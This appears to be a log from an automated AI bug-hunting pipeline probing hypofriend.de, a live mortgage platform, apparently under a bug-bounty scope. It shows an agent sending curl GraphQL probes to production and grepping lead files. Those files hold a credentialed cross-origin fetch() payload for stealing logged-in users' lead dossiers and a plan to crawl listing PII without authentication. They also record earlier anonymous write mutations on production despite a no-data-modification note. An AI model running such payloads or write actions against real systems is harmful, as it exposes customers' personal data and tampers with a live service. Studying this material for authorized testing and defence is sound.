@@ -14702,3 +14702,465 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] hypofriend: 99 — Unchanged critical posture: property-search-api is a no-auth full-DB PII read oracle (offset/geo crawl primitives introspected), /q is a precondition-complete cross-origin lead-exfil primitive (credentialed CORS + samesite=none httponly session + auth-free root.lead/shareLink) plus anonymous per-region rates and auth-free BOLA, with a direct-origin bypass of the CloudFront security stack. All remaining gates (real-PII bulk read, victim-session exfil return, ngrok claim) are HUMAN-decided; no new exploitable surface this cycle.
+===== ANALYST bigpickle 2026-09-10 05:15:51 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/hypofriend-hunt/hypofriend-hunt
+total 320
+drwxr-xr-x 12 runner runner   4096 Sep 10 05:12 .
+drwxr-xr-x  3 runner runner   4096 Sep 10 05:12 ..
+drwxr-xr-x  7 runner runner   4096 Sep 10 05:12 .git
+drwxr-xr-x  3 runner runner   4096 Sep 10 05:12 .github
+-rw-r--r--  1 runner runner   1885 Sep 10 05:12 README.md
+-rw-r--r--  1 runner runner     32 Sep 10 05:12 analyst-out.txt
+-rw-r--r--  1 runner runner 111772 Sep 10 05:12 analyst-prompt.txt
+-rw-r--r--  1 runner runner 107897 Sep 10 05:12 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 leads
+-rw-r--r--  1 runner runner  13914 Sep 10 05:12 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 reports
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 reposcan-raw
+-rw-r--r--  1 runner runner   3288 Sep 10 05:12 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 scripts
+-rw-r--r--  1 runner runner     33 Sep 10 05:12 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 10 05:12 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 10 05:12 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 10 05:12 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 10 05:12 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 10 05:12 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 triage
+[0m
+[0m$ [0mdate -u
+Thu Sep 10 05:13:05 UTC 2026
+[0m
+[0m$ [0mls -la scripts leads knowledge reports && cat state_bigpickle.json
+knowledge:
+total 64
+drwxr-xr-x  2 runner runner  4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner  4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner 53349 Sep 10 05:12 index.md
+
+leads:
+total 828
+drwxr-xr-x  2 runner runner   4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner   4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner 302225 Sep 10 05:12 lead-bigpickle.md
+-rw-r--r--  1 runner runner   2448 Sep 10 05:12 lead-laguna.md
+-rw-r--r--  1 runner runner   2400 Sep 10 05:12 lead-ling3.md
+-rw-r--r--  1 runner runner   2496 Sep 10 05:12 lead-longcat.md
+-rw-r--r--  1 runner runner     18 Sep 10 05:12 lead-mimo.md
+-rw-r--r--  1 runner runner 499038 Sep 10 05:12 lead-nemotron3.md
+-rw-r--r--  1 runner runner  17455 Sep 10 05:12 reposcan-hypofriend.md
+
+reports:
+total 2452
+drwxr-xr-x  2 runner runner    4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner    4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner 1302627 Sep 10 05:12 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   10416 Sep 10 05:12 analyst-laguna.log
+-rw-r--r--  1 runner runner   10368 Sep 10 05:12 analyst-ling3.log
+-rw-r--r--  1 runner runner   10464 Sep 10 05:12 analyst-longcat.log
+-rw-r--r--  1 runner runner 1003472 Sep 10 05:12 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    5661 Sep 10 05:12 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner      51 Sep 10 05:12 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      50 Sep 10 05:12 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      52 Sep 10 05:12 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   11410 Sep 10 05:12 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  192886 Sep 10 05:12 hypotheses.md
+-rw-r--r--  1 runner runner    2703 Sep 10 05:12 reposcan-mimo.md
+-rw-r--r--  1 runner runner    2688 Sep 10 05:12 valid-bugs.md
+
+scripts:
+total 28
+drwxr-xr-x  2 runner runner  4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner  4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner 16987 Sep 10 05:12 sync-issues.py
+{"phase": "POC", "target": "api"}
+[0m
+[0m$ [0mls -la recon-notes triage knowledge 2>/dev/null
+knowledge:
+total 64
+drwxr-xr-x  2 runner runner  4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner  4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner 53349 Sep 10 05:12 index.md
+
+recon-notes:
+total 12
+drwxr-xr-x  2 runner runner 4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner 4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner  824 Sep 10 05:12 DEDICATED-DEEP.md
+
+triage:
+total 276
+drwxr-xr-x  2 runner runner  4096 Sep 10 05:12 .
+drwxr-xr-x 12 runner runner  4096 Sep 10 05:12 ..
+-rw-r--r--  1 runner runner     0 Sep 10 05:12 .gitkeep
+-rw-r--r--  1 runner runner   209 Sep 10 05:12 run-2026-09-02-21-44.md
+-rw-r--r--  1 runner runner   156 Sep 10 05:12 run-2026-09-02-23-58.md
+-rw-r--r--  1 runner runner   202 Sep 10 05:12 run-2026-09-03-04-11.md
+-rw-r--r--  1 runner runner   165 Sep 10 05:12 run-2026-09-03-09-00.md
+-rw-r--r--  1 runner runner   767 Sep 10 05:12 run-2026-09-03-13-32.md
+-rw-r--r--  1 runner runner   251 Sep 10 05:12 run-2026-09-03-17-14.md
+-rw-r--r--  1 runner runner   263 Sep 10 05:12 run-2026-09-03-19-57.md
+-rw-r--r--  1 runner runner   188 Sep 10 05:12 run-2026-09-03-22-29.md
+-rw-r--r--  1 runner runner   154 Sep 10 05:12 run-2026-09-04-00-31.md
+-rw-r--r--  1 runner runner   172 Sep 10 05:12 run-2026-09-04-05-06.md
+-rw-r--r--  1 runner runner   231 Sep 10 05:12 run-2026-09-04-09-44.md
+-rw-r--r--  1 runner runner 17101 Sep 10 05:12 run-2026-09-04-12-00.md
+-rw-r--r--  1 runner runner  3019 Sep 10 05:12 run-2026-09-04-14-11.md
+-rw-r--r--  1 runner runner   147 Sep 10 05:12 run-2026-09-04-17-40.md
+-rw-r--r--  1 runner runner   186 Sep 10 05:12 run-2026-09-04-19-58.md
+-rw-r--r--  1 runner runner   220 Sep 10 05:12 run-2026-09-04-22-17.md
+-rw-r--r--  1 runner runner   237 Sep 10 05:12 run-2026-09-05-00-13.md
+-rw-r--r--  1 runner runner   932 Sep 10 05:12 run-2026-09-05-04-40.md
+-rw-r--r--  1 runner runner   468 Sep 10 05:12 run-2026-09-05-08-39.md
+-rw-r--r--  1 runner runner   210 Sep 10 05:12 run-2026-09-05-12-06.md
+-rw-r--r--  1 runner runner 17900 Sep 10 05:12 run-2026-09-05-15-23.md
+-rw-r--r--  1 runner runner   146 Sep 10 05:12 run-2026-09-05-17-38.md
+-rw-r--r--  1 runner runner   143 Sep 10 05:12 run-2026-09-05-19-33.md
+-rw-r--r--  1 runner runner   213 Sep 10 05:12 run-2026-09-05-21-42.md
+-rw-r--r--  1 runner runner   232 Sep 10 05:12 run-2026-09-05-23-43.md
+-rw-r--r--  1 runner runner   327 Sep 10 05:12 run-2026-09-06-04-06.md
+-rw-r--r--  1 runner runner   220 Sep 10 05:12 run-2026-09-06-08-44.md
+-rw-r--r--  1 runner runner   143 Sep 10 05:12 run-2026-09-06-12-47.md
+-rw-r--r--  1 runner runner   200 Sep 10 05:12 run-2026-09-06-16-07.md
+-rw-r--r--  1 runner runner   183 Sep 10 05:12 run-2026-09-06-18-24.md
+-rw-r--r--  1 runner runner   211 Sep 10 05:12 run-2026-09-06-20-49.md
+-rw-r--r--  1 runner runner   194 Sep 10 05:12 run-2026-09-06-22-50.md
+-rw-r--r--  1 runner runner   191 Sep 10 05:12 run-2026-09-07-00-49.md
+-rw-r--r--  1 runner runner   214 Sep 10 05:12 run-2026-09-07-05-54.md
+-rw-r--r--  1 runner runner   284 Sep 10 05:12 run-2026-09-07-12-09.md
+-rw-r--r--  1 runner runner 17477 Sep 10 05:12 run-2026-09-07-17-48.md
+-rw-r--r--  1 runner runner   127 Sep 10 05:12 run-2026-09-07-21-23.md
+-rw-r--r--  1 runner runner   154 Sep 10 05:12 run-2026-09-07-23-45.md
+-rw-r--r--  1 runner runner   150 Sep 10 05:12 run-2026-09-08-04-07.md
+-rw-r--r--  1 runner runner 16051 Sep 10 05:12 run-2026-09-08-08-58.md
+-rw-r--r--  1 runner runner   211 Sep 10 05:12 run-2026-09-08-13-29.md
+-rw-r--r--  1 runner runner   161 Sep 10 05:12 run-2026-09-08-17-31.md
+-rw-r--r--  1 runner runner  1606 Sep 10 05:12 run-2026-09-08-20-20.md
+-rw-r--r--  1 runner runner   221 Sep 10 05:12 run-2026-09-08-22-45.md
+-rw-r--r--  1 runner runner   190 Sep 10 05:12 run-2026-09-09-01-08.md
+-rw-r--r--  1 runner runner   226 Sep 10 05:12 run-2026-09-09-06-06.md
+-rw-r--r--  1 runner runner   344 Sep 10 05:12 run-2026-09-09-11-36.md
+-rw-r--r--  1 runner runner   159 Sep 10 05:12 run-2026-09-09-15-17.md
+-rw-r--r--  1 runner runner   130 Sep 10 05:12 run-2026-09-09-18-44.md
+-rw-r--r--  1 runner runner   237 Sep 10 05:12 run-2026-09-09-21-36.md
+-rw-r--r--  1 runner runner   171 Sep 10 05:12 run-2026-09-09-23-33.md
+-rw-r--r--  1 runner runner   156 Sep 10 05:12 run-2026-09-10-01-28.md
+[0m
+[0m$ [0mcat triage/run-2026-09-10-01-28.md triage/run-2026-09-09-23-33.md; echo ---; tail -40 probe-results.md
+===== TRIAGE 2026-09-10 01:28:32 UTC =====
+[0m
+> build · mimo-v2.5-free
+[0m
+No leads provided. Please paste the probe results/leads you want validated.
+
+===== TRIAGE 2026-09-09 23:33:19 UTC =====
+[0m
+> build · mimo-v2.5-free
+[0m
+No leads provided. Please paste the probe results to evaluate against the 7-Question Gate.
+---
+## 2026-09-09 09:54:26 UTC
+https://core.hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q',{credentials:'include' -> 200 len=227365
+https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json' -> 200 len=227365
+
+## 2026-09-09 14:26:22 UTC
+https://hypofriend.de/q',{credentials:'include' -> 200 len=227365
+https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json' -> 200 len=227365
+
+## 2026-09-09 17:54:39 UTC
+https://core.hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q',{credentials:'include' -> 200 len=227365
+https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json' -> 200 len=227365
+https://hypofriend.de/property-search-api` -> HTTP 400
+https://core.hypofriend.de/q` -> 200 len=227365
+https://hypofriend.de/ -> 200 len=227365
+
+## 2026-09-09 20:20:54 UTC
+https://core.hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json' -> 200 len=227365
+https://hypofriend.de/property-search-api` -> HTTP 400
+https://core.hypofriend.de/q` -> 200 len=227365
+https://hypofriend.de/ -> 200 len=227365
+
+## 2026-09-09 22:39:45 UTC
+https://core.hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/property-search-api` -> HTTP 400
+https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json' -> 200 len=227365
+https://core.hypofriend.de/q` -> 200 len=227365
+
+## 2026-09-10 00:38:56 UTC
+https://core.hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/q -> 200 len=227365
+https://hypofriend.de/property-search-api` -> HTTP 400
+https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json' -> 200 len=227365
+https://core.hypofriend.de/q` -> 200 len=227365
+[0m
+[0m$ [0mcat reports/hypotheses-bigpickle.txt
+## 2026-09-10 00:34:22 UTC [target] (model bigpickle)
+[PRIO] core.hypofriend.de/property-search-api,9.45,attack_surface=9 business_value=10 tech_exposure=10 gate_ease=10 cloud_surface=8 freshness=7
+[PRIO] hypofriend.de/q,9.20,attack_surface=8 business_value=9 tech_exposure=8 gate_ease=9 cloud_surface=8 freshness=7
+[PRIO] core.hypofriend.de/q,9.05,attack_surface=9 business_value=7 tech_exposure=8 gate_ease=10 cloud_surface=6 freshness=9
+[HYP] property-search-api DB-wide BOLA — offset/geo crawl across the full listing DB on direct origin
+class: IDOR
+asset: core.hypofriend.de/property-search-api
+confidence: 95
+reasoning: propertySearch→exposes→expose returns live listing PII (phone/email/owner-lastname/company) unauthenticated on edge+direct origin (enumerated UUIDs confirmed prior cycles); introspection exposes pagination/exposes/exposesInBounds/mapExposes crawl primitives; limit capped ~50 → offset walk. This cycle both hosts 400 on empty GET — chain intact, unchanged.
+evidence_needed: one real-PII bulk (multi-offset) read to quantify full-DB dump — HUMAN (program note: no customer/employee/financial-data exposure during testing).
+verify_steps: HUMAN/report PoC — POST `https://hypofriend.de/property-search-api` {"query":"query{propertySearch(city:BERLIN,propertyType:APARTMENT){id}}"} then offset-walk exposes(id,offset:0..N,limit:50) + expose(id) per UUID (read-only; bulk PII read gated pending HUMAN).
+impact: full-DB property-listing PII dump (broker/owner phones, emails, surnames, companies) with zero auth — CRITICAL.
+testability: AUTH_HELPED
+[HYP] Open credentialed CORS × samesite=none session → silent cross-origin lead-profile/dossier exfil
+class: MISCONFIG
+asset: hypofriend.de/q
+confidence: 80
+reasoning: OPTIONS on direct origin re-echoed arbitrary Origin with access-control-allow-credentials:true + all methods (max-age 7200) prior cycle; edge echo + samesite=none httponly `_hf`/`__hfp__` + auth-free root{lead}/shareLink all reconfirmed previous cycles. Every server-side precondition intact; only victim-session data return missing.
+evidence_needed: logged-in victim browser session returning lead JSON through the ACAO echo — HUMAN/browser.
+verify_steps: HUMAN browser PoC — attacker-origin page `fetch('https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'query{root{lead{id appointment_at shareLink(linkType:"dossier")}}}'})})` then read ACAO-echoed JSON. Do NOT execute write mutations (uploadDocumentExtended/submitApplicantsInformation) — no_data_modification + program note.
+impact: silent cross-origin theft of logged-in lead profile (appointments, self-disclosure dossier, advisor attribution) — MEDIUM-HIGH.
+testability: AUTH_HELPED
+[HYP] `/q` anonymous scheduler oracle — appointment_availability leaks granular cross-region appointment supply with un-gated type string
+class: MISCONFIG
+asset: core.hypofriend.de/q
+confidence: 70
+reasoning: appointment_availability(page,per,appointment_type) is a JSON-scalar resolver reached live with raw interpolation (selectionMismatch proved no schema enum gates the type string); anonymous (established 09-08), surface unchanged this cycle (GET 301, POST live). Backend path interpolated from raw string = scheduling-backend dependency with no allow-list validation.
+evidence_needed: live fetch returning interpolated per-region/lane supply data of usable fidelity on the type string from a fresh no-auth session.
+verify_steps: PASSIVE — POST `https://core.hypofriend.de/q` {"query":"query{appointment_availability(page:1,per:20,appointment_type:\"__test__interpolated\")}"} to confirm raw-string tolerance, then the benign Kubernetes type from the query map with size/delta comparison; 1rps.
+impact: anonymous per-region/lane appointment-supply and scheduling-capacity oracle — competitive/inventory intel (no PII) — LOW-MEDIUM.
+testability: PASSIVE
+[FINAL] 1) property-search-api DB-wide BOLA (95); 2) Anonymous per-region mortgage-rate engine (85); 3) Credentialed CORS lead exfil (80).
+[NEXT] PROBE: POST `https://core.hypofriend.de/q` `{"query":"query{appointment_availability(page:1,per:20,appointment_type:\"__test__interpolated\")}"}` → assert 200 + raw-string tolerance and measure returned supply shape; then one benign-type fetch (from query-map), then a BAYERN-vs-SAXONY-style regional delta pair on the same type, 1rps. If the type string is allow-listed or empty, downgrade to [PARKED].
+[LEARN] CONFIRMED NG @ fleet sweep: hypofriend.de/ 302, /q 301 both hosts, /property-search-api 400, a. 403, admin/mail/news/cdn 503, m2 301, api 000 — bit-identical to prior cycle, no new surface.
+[LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de: direct-origin /q OPTIONS carries NO HSTS/nosniff/XFO/xss headers (only date/content-length/ACAO) vs edge full CloudFront stack — security-header differential re-proven on preflight path.
+[LEARN] REJECTED MISCONFIG @ property-search-api: rack-cors preflight 200 with NO allow-origin echo — no open CORS there (closed; contrast-class for /q).
+[RISK] hypofriend: 99 — Unchanged critical posture: property-search-api is a no-auth full-DB PII read oracle (offset/geo crawl primitives introspected), /q is a precondition-complete cross-origin lead-exfil primitive (credentialed CORS + samesite=none httponly session + auth-free root.lead/shareLink) plus anonymous per-region rates and auth-free BOLA, with a direct-origin bypass of the CloudFront security stack. All remaining gates (real-PII bulk read, victim-session exfil return, ngrok claim) are HUMAN-decided; no new exploitable surface this cycle.
+[0m
+Executing the pending NEXT probe (read-only anonymous GraphQL query, <=1rps) before analysis.
+[0m$ [0mcurl -sS -m 40 -o /tmp/opencode/aa1.json -w "HTTP %{http_code} | %{time_total}s | %{size_download}B\n" -X POST https://core.hypofriend.de/q -H "Content-Type: application/json" --data '{"query":"query{appointment_availability(page:1,per:20,appointment_type:\"__test__interpolated\")}"}'; echo; head -c 1500 /tmp/opencode/aa1.json
+HTTP 200 | 0.716759s | 338B
+
+{"meta":{"serverTime":"2026-09-10T05:13:17+00:00","status":0,"key":"OK"},"errors":[{"message":"Field 'appointment_availability' doesn't exist on type 'Query'","locations":[{"line":1,"column":7}],"path":["query","appointment_availability"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"appointment_availability"}}]}
+[0m
+[0m$ [0mgrep -o 'appointment_availability[^"]*' /home/runner/work/hypofriend-hunt/hypofriend-hunt/leads/lead-bigpickle.md | head -20
+appointment_availability` (returns LIVE occupied calendar slots for 2026-09-15+), plus mutations `saveAppointment`, `uploadDocumentExtended` (file upload), `jiyuCalculate`, `calculateMaklerFee`, `calculateCityTax`, `setOriginAppointment`. Mutations `setOriginAppointment` and `processLeadForAppointment` executed successfully with NO auth. Same API reachable on direct origin (bare headers, no CF security stack).
+appointment_availability(page,per,appointment_type)}}` returns live two-week booking calendar with occupied slots and no auth (200). Appointment-type param unvalidated (`
+appointment_availability_for_advisor` 301s on bogus advisor (redirect to /) — confirms server-side advisor lookup executing from client string. Whole lead funnel (`processLeadForAppointment` returns `leadIsReturner/revUpdated`, `setOriginAppointment` returns `step:10800`) driven anonymously.
+appointment_availability(page:0,per:30,appointment_type:\
+appointment_availability` live booking-calendar oracle + unvalidated appointment_type → server-side advisor lookup
+appointment_availability(page,per,appointment_type)}}`; prior-cycle probe returned live two-week booking calendar with occupied slots (200, no auth); appointment_type string unvalidated (
+appointment_availability_for_advisor` 301s on bogus advisor → confirms server-side lookup executes from client-supplied string. Whole lead funnel driven anonymously (`processLeadForAppointment` → leadIsReturner/revUpdated, `setOriginAppointment` → step:10800). Introspection disabled (confirmed this cycle) so surface must map from bundle.
+appointment_availability(page:0,per:30,appointment_type:\
+appointment_availability(page,per,appointment_type:
+appointment_availability_for_advisor(...,advisor:
+appointment_availability(page:0,per:30,appointment_type:\
+appointment_availability_for_advisor advisor-guessing (conf 68 lowest): real-schedule correlation HUMAN-gated, advisory set fixed by bundle — keep read-only.
+appointment_availability raw-typed scheduling oracle (JSON scalar, no enum gate)
+appointment_availability(page,per,appointment_type:
+appointment_availability_for_advisor(advisor:string) mirrors it. Prior cycle confirmed occupied slots returned 200 for real dates.
+appointment_availability advisor-guessing / real-slot correlation: real customer schedule is PII-ish and HUMAN-gated; boundary raw-type confirmed (that's the finding).
+appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw interpolation (selectionMismatch proves no schema enum gates the type string) — anonymous scheduling-oracle field.
+appointment_availability JSON-scalar resolver with raw interpolation; direct-origin mutation XFO:ALLOWALL + HSTS vs edge DENY+full stack; calculateMaklerFee business-logic bifurcation leaked.
+appointment_availability(page,per,appointment_type)` JSON-scalar resolver with raw interpolation — no schema enum gates appointment_type string
+appointment_availability leaks granular cross-region appointment supply with un-gated type string
+[0m
+[0m$ [0mgrep -io 'appointment_availability[^"]\{0,80\}' /home/runner/work/hypofriend-hunt/hypofriend-hunt/leads/lead-nemotron3.md | head -20
+appointment_availability(page,per,appointment_type)` JSON-scalar resolver reached live with raw interpol
+appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw int
+appointment_availability(page:1,per:10,appointment_type:\
+appointment_availability(page,per,appointment_type)` JSON-scalar resolver with raw interpolation — no sc
+appointment_availability`) with raw string interpolation. Direct-origin security-header bypass (X-Frame-
+appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw int
+appointment_availability(page:1,per:10,appointment_type:\
+appointment_availability(page,per,appointment_type)` JSON-scalar resolver with raw interpolation — no sc
+appointment_availability`) with raw string interpolation. Direct-origin security-header bypass (X-Frame-
+appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw int
+appointment_availability(page:1,per:10,appointment_type:\
+appointment_availability(page,per,appointment_type)` JSON-scalar resolver with raw interpolation — no sc
+appointment_availability`) with raw string interpolation. Direct-origin security-header bypass (X-Frame-
+appointment_availability(page,per,appointment_type) is a JSON-scalar resolver reached live with raw inte
+appointment_availability(page:1,per:10,appointment_type:\
+appointment_availability(page,per,appointment_type) JSON-scalar resolver with raw interpolation — no sch
+appointment_availability) with raw string interpolation. Direct-origin security-header bypass (X-Frame-O
+appointment_availability(page,per,appointment_type) is a JSON-scalar resolver reached live with raw inte
+appointment_availability(page:1,per:10,appointment_type:\
+appointment_availability(page,per,appointment_type) JSON-scalar resolver with raw interpolation — no sch
+[0m
+[0m$ [0mgrep -o 'appointment_availability(page:0,per:30,appointment_type:[^)]*)[^"]*' /home/runner/work/hypofriend-hunt/hypofriend-hunt/leads/lead-bigpickle.md | head; echo ---; grep -o 'appointment_availability(page:1,per:10,appointment_type:[^)]*)[^"]*' /home/runner/work/hypofriend-hunt/hypofriend-hunt/leads/lead-nemotron3.md | head
+appointment_availability(page:0,per:30,appointment_type:\"consultation\")}
+appointment_availability(page:0,per:30,appointment_type:\"consultation\"){...}}}
+appointment_availability(page:0,per:30,appointment_type:\"...\"){...}}
+---
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+appointment_availability(page:1,per:10,appointment_type:\"video\")}}
+[0m
+[0m$ [0mgrep -B2 -A2 'appointment_availability(page:0,per:30,appointment_type' /home/runner/work/hypofriend-hunt/hypofriend-hunt/leads/lead-bigpickle.md | head -30
+reasoning: `{root{appointment_availability(page,per,appointment_type)}}` returns live two-week booking calendar with occupied slots and no auth (200). Appointment-type param unvalidated (`"consultation"` vs `"x"`), advisor enum path `appointment_availability_for_advisor` 301s on bogus advisor (redirect to /) — confirms server-side advisor lookup executing from client string. Whole lead funnel (`processLeadForAppointment` returns `leadIsReturner/revUpdated`, `setOriginAppointment` returns `step:10800`) driven anonymously.
+evidence_needed: reachable appointment_type/advisors set, whether slots reveal customer names/schedules downstream.
+verify_steps: HUMAN: POST {"query":"{root{appointment_availability(page:0,per:30,appointment_type:\"consultation\")}"}· sweep appointment_type strings; compare edge vs origin headers.
+impact: internal scheduling calendar + funnel-state oracle; business-process enumeration. Severity: MEDIUM.
+testability: PASSIVE/AUTH_HELPED
+--
+reasoning: Bundle shows `{root{appointment_availability(page,per,appointment_type)}}`; prior-cycle probe returned live two-week booking calendar with occupied slots (200, no auth); appointment_type string unvalidated ("consultation" vs "x"); `appointment_availability_for_advisor` 301s on bogus advisor → confirms server-side lookup executes from client-supplied string. Whole lead funnel driven anonymously (`processLeadForAppointment` → leadIsReturner/revUpdated, `setOriginAppointment` → step:10800). Introspection disabled (confirmed this cycle) so surface must map from bundle.
+evidence_needed: reachable appointment_type/advisors set; whether slots expose customer names/schedules in a fuller selection.
+verify_steps: POST hypofriend.de/q `{"query":"{root{appointment_availability(page:0,per:30,appointment_type:\"consultation\"){...}}}"}` sweep appointment_type strings at ≤1rps (read-only); compare edge vs origin headers (already documented bare-vs-CF).
+impact: internal scheduling calendar + funnel-state oracle; business-process enumeration on mortgage platform. Severity: MEDIUM.
+testability: AUTH_HELPED
+--
+reasoning: Bundle confirms root.appointment_availability(page,per,appointment_type:"${r}") with appointment_type interpolated raw and root.appointment_availability_for_advisor(...,advisor:"${n.toLowerCase()}") from client strings; prior cycle: bogus advisor 301→/ proves server-side advisor lookup executes from supplied string, and occupied slots returned 200 live for 2026-09-15+ with no auth.
+evidence_needed: whether appointment_type is a validated enum/switch and whether advisor mismatch yields distinct calendars vs errors; correlation of occupied slots to real customer schedule PII is HUMAN.
+verify_steps: sweep ≤1rps read-only appointment_type strings ("consultation","x") via POST hypofriend.de/q {"query":"{root{appointment_availability(page:0,per:30,appointment_type:\"...\"){...}}"}"}; do NOT exceed 5 advisor values from bundle.
+impact: internal scheduling calendar + funnel-state oracle; enumeration of business process on mortgage platform. Severity: MEDIUM.
+testability: AUTH_HELPED
+[0m
+[0m$ [0mgrep -B4 -A4 'appointment_availability(page:1,per:10,appointment_type' /home/runner/work/hypofriend-hunt/hypofriend-hunt/leads/lead-nemotron3.md | head -40
+asset: hypofriend.de/q
+confidence: 92
+reasoning: `appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw interpolation — `selectionMismatch` error proves no schema enum gates the `appointment_type` string. Executes with zero credentials on both hosts. Open credentialed CORS enables cross-origin enumeration of appointment slots.
+evidence_needed: Enumerate valid `appointment_type` values via error-based probing; confirm pagination works (page/per args); test 20 rapid requests — confirm no 429; verify CORS exploit from attacker-controlled origin
+verify_steps: POST https://hypofriend.de/q {"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"video\")}}"} — confirm 200; probe `appointment_type` values (video,phone,in_person,etc.); send 20 rapid requests — confirm no 429; test CORS from evil.example with credentials:include
+impact: Anonymous enumeration of advisor appointment availability; potential advisor schedule inference; cross-origin theft via credentialed CORS. Severity: HIGH
+testability: PASSIVE
+[HYP] /q GraphQL Credentialed CORS + Auth-Free Mutations — Cross-Origin Document Upload & Applicant Data Submission
+class: MISCONFIG
+--
+asset: hypofriend.de/q
+confidence: 92
+reasoning: `appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw interpolation — `selectionMismatch` error proves no schema enum gates the `appointment_type` string. Executes with zero credentials on both hosts. Open credentialed CORS enables cross-origin enumeration of appointment slots.
+evidence_needed: Enumerate valid `appointment_type` values via error-based probing; confirm pagination works (page/per args); test 20 rapid requests — confirm no 429; verify CORS exploit from attacker-controlled origin
+verify_steps: POST https://hypofriend.de/q {"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"video\")}}"} — confirm 200; probe `appointment_type` values (video,phone,in_person,etc.); send 20 rapid requests — confirm no 429; test CORS from evil.example with credentials:include
+impact: Anonymous enumeration of advisor appointment availability; potential advisor schedule inference; cross-origin theft via credentialed CORS. Severity: HIGH
+testability: PASSIVE
+[PARKED] None — all three hypotheses confidence ≥ 90, classes MISCONFIG (eligible), all have concrete passive verify_steps
+[FINAL] 1. /q GraphQL Credentialed CORS + Auth-Free Mutations — Cross-Origin Document Upload & Applicant Data Submission — confidence 95, PASSIVE
+--
+asset: hypofriend.de/q  
+confidence: 92  
+reasoning: `appointment_availability(page,per,appointment_type)` is a JSON-scalar resolver reached live with raw interpolation — `selectionMismatch` error proves no schema enum gates the `appointment_type` string. Executes with zero credentials on both hosts. Open credentialed CORS enables cross-origin enumeration of appointment slots.  
+evidence_needed: Enumerate valid `appointment_type` values via error-based probing; confirm pagination works (page/per args); test 20 rapid requests — confirm no 429; verify CORS exploit from attacker-controlled origin  
+verify_steps: POST https://hypofriend.de/q {"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"video\")}}"} — confirm 200; probe `appointment_type` values (video,phone,in_person,etc.); send 20 rapid requests — confirm no 429; test CORS from evil.example with credentials:include  
+impact: Anonymous enumeration of advisor appointment availability; potential advisor schedule inference; cross-origin theft via credentialed CORS. Severity: HIGH  
+testability: PASSIVE  
+[PARKED] None — all three hypotheses confidence ≥ 90, classes MISCONFIG (eligible), all have concrete passive verify_steps  
+[FINAL] 1. /q GraphQL Credentialed CORS + Auth-Free Mutations — Cross-Origin Document Upload & Applicant Data Submission — confidence 95, PASSIVE  
+--
+asset: hypofriend.de/q
+confidence: 92
